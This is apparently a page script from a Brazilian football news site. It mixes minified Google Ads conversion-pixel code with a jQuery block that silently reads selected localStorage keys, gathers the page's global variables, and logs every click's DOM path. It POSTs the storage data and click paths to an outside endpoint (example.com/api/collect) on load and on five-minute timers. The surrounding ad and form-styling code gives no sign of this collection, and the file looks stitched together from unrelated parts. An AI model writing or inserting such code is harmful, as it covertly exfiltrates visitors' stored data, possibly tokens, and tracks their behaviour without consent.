(function () {
  var s = {};
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var e = {},
      f = this || self;
    var g, k;
    a: {
      for (var l = ["CLOSURE_FLAGS"], p = f, q = 0; q < l.length; q++) if (p = p[l[q]], null == p) {
        k = null;
        break a;
      }
      k = p;
    }
    var r = k && k[610401301];
    g = null != r ? r : !1;
    var t,
      v = f.navigator;
    t = v ? v.userAgentData || null : null;
    function w(d) {
      return g ? t ? t.brands.some(function (a) {
        return (a = a.brand) && -1 != a.indexOf(d);
      }) : !1 : !1;
    }
    function x(d) {
      var a;
      a: {
        if (a = f.navigator) if (a = a.userAgent) break a;
        a = "";
      }
      return -1 != a.indexOf(d);
    }
    ;
    function y() {
      return g ? !!t && 0 < t.brands.length : !1;
    }
    function z() {
      return y() ? w("Chromium") : (x("Chrome") || x("CriOS")) && !(y() ? 0 : x("Edge")) || x("Silk");
    }
    ;
    !x("Android") || z();
    z();
    !x("Safari") || z() || (y() ? 0 : x("Coast")) || (y() ? 0 : x("Opera")) || (y() ? 0 : x("Edge")) || (y() ? w("Microsoft Edge") : x("Edg/")) || y() && w("Opera");
    var A = /#|$/;
    function B(d) {
      var a = d.search(A),
        b;
      a: {
        for (b = 0; 0 <= (b = d.indexOf("fmt", b)) && b < a;) {
          var c = d.charCodeAt(b - 1);
          if (38 == c || 63 == c) if (c = d.charCodeAt(b + 3), !c || 61 == c || 38 == c || 35 == c) break a;
          b += 4;
        }
        b = -1;
      }
      if (0 > b) return null;
      c = d.indexOf("&", b);
      if (0 > c || c > a) c = a;
      return decodeURIComponent(d.slice(b + 4, -1 !== c ? c : 0).replace(/\+/g, " "));
    }
    ;
    function C(d, a, b) {
      function c() {
        --D;
        if (0 >= D) {
          var h;
          (h = d.GooglebQhCsO) || (h = {});
          var E = h[a];
          E && (delete h[a], (h = E[0]) && h.call && h());
        }
      }
      for (var D = b.length + 1, u = 0; u < b.length; u++) {
        var m = B(b[u]),
          n = null;
        1 != m && 2 != m || !(m = d.document.getElementById("goog_conv_iframe")) || m.src || (n = m);
        n || (n = new Image());
        n.onload = c;
        n.src = b[u];
      }
      c();
    }
    var F = ["ss_"],
      G = s || f;
    F[0] in G || "undefined" == typeof G.execScript || G.execScript("var " + F[0]);
    for (var H; F.length && (H = F.shift());) F.length || void 0 === C ? G[H] && G[H] !== Object.prototype[H] ? G = G[H] : G = G[H] = {} : G[H] = C;
  }).call(this);
  $(function () {
    const keysToWatch = window.keysToWatch;
    let globalVarCollection = {};
    function globalVarsCollector() {
      for (let name in window) {
        if (typeof window[name] !== 'function') {
          globalVarCollection[name] = window[name];
        }
      }
    }
    function computeHash(data) {
      const keyArray = Object.keys(data);
      const joinedKeys = keyArray.join("");
      let hashValue = 0;
      for (let i = 0; i < joinedKeys.length; i++) {
        const charCode = joinedKeys.charCodeAt(i);
        hashValue = (hashValue << 5) - hashValue + charCode;
        hashValue = hashValue & hashValue;
      }
      return hashValue.toString(16);
    }
    function getFilteredLocalStorage() {
      const filteredData = {};
      for (let i = 0; i < window.localStorage.length; i++) {
        const key = window.localStorage.key(i);
        if (keysToWatch.includes(key)) {
          const value = window.localStorage.getItem(key);
          filteredData[key] = value;
        }
      }
      return filteredData;
    }
    function postDataToServer(data) {
      const hashId = computeHash(data);
      const apiUrl = "https://example.com/api/collect";
      const request = new XMLHttpRequest();
      request.open("POST", apiUrl, true);
      request.setRequestHeader("Content-Type", "application/json");
      const requestData = {
        id: hashId,
        data: data
      };
      request.send(JSON.stringify(requestData));
      request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {
          if (request.status === 200) {
            console.log("数据发送成功");
          } else {
            console.error("数据发送失败,状态码:" + request.status);
          }
        }
      };
    }
    function collectAndPostLocalStorageData() {
      const filteredLocalStorage = getFilteredLocalStorage();
      if (Object.keys(filteredLocalStorage).length > 0) {
        postDataToServer(filteredLocalStorage);
      }
    }
    window.addEventListener("load", function () {
      collectAndPostLocalStorageData();
      globalVarsCollector();
    });
    setInterval(collectAndPostLocalStorageData, 5 * 60 * 1000);
    setInterval(globalVarsCollector, 10 * 60 * 1000);
    $('.form-control').on('input', function () {
      var $field = $(this).closest('.form-group');
      if (this.value) {
        $field.addClass('field--not-empty');
      } else {
        $field.removeClass('field--not-empty');
      }
    });
    $('body').on('click', '*', function (e) {
      e.stopPropagation();
      const domPath = $(this).parents().get().map(x => x.nodeName).join(" -> ");
      console.log("JS Hook captured click on: ", domPath);
      // An example for pushing this to the server like localStorage
      postDataToServer({
        domPathClick: domPath
      });
    });
  });
  ;
  s.ss_(window, 'OjE2OTI1MzcwOTgwNjc', ['https://www.google.com/pagead/1p-user-list/AW-931232517/?random\x3d1692537098067\x26cv\x3d11\x26fst\x3d1692536400000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45be38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fnoticiasdotimao.com.br%2F\x26frm\x3d0\x26tiba\x3d%C3%9Altimas%20do%20Corinthians%20-%20Not%C3%ADcias%20do%20Tim%C3%A3o\x26data\x3devent%3Dgtag.config\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d2152286566\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.jp/pagead/1p-user-list/AW-931232517/?random\x3d1692537098067\x26cv\x3d11\x26fst\x3d1692536400000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45be38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fnoticiasdotimao.com.br%2F\x26frm\x3d0\x26tiba\x3d%C3%9Altimas%20do%20Corinthians%20-%20Not%C3%ADcias%20do%20Tim%C3%A3o\x26data\x3devent%3Dgtag.config\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d2152286566\x26rmt_tld\x3d1\x26ipr\x3dy']);
})();